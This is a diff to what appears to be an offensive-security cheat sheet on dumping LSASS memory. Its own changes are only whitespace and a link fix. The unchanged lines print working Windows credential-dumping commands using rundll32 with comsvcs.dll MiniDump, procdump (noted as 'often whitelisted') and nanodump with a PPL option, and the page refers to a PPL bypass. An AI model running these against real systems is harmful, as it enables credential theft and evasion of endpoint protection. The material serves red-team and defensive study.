@@ -18,17 +18,17 @@ title: "LSASS"
 ::: code-group
 
 ```cmd [cmd]
-tasklist /fi "imagename eq lsass.exe"                             # get PID
+tasklist /fi "imagename eq lsass.exe"   # get PID
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\Windows\Temp\lsass.dmp full
 ```
 
 ```powershell [PowerShell]
-(Get-Process lsass).Id                                            # get PID
+(Get-Process lsass).Id   # get PID
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\Windows\Temp\lsass.dmp full
 ```
 
 ```cmd [procdump]
-procdump.exe -accepteula -ma lsass.exe lsass.dmp                  # signed Sysinternals binary, often whitelisted
+procdump.exe -accepteula -ma lsass.exe lsass.dmp   # signed Sysinternals binary, often whitelisted
 ```
 
 ```bash [nanodump]
@@ -44,7 +44,7 @@ nanodump.x64.exe --ppl --write C:\Windows\Temp\lsass.dmp
 ### Privileges required
 
 - Local Administrator (or SYSTEM)
-- PPL (Protected Process Light) may block dumping on Windows 10/11 -> see [PPL bypass](#ppl-bypass-windows-1011)
+- PPL (Protected Process Light) may block dumping on Windows 10/11 -> see [PPL bypass](#ppl-bypass-windows-10-11)
 
 ### Live parsing (no dump file)
 
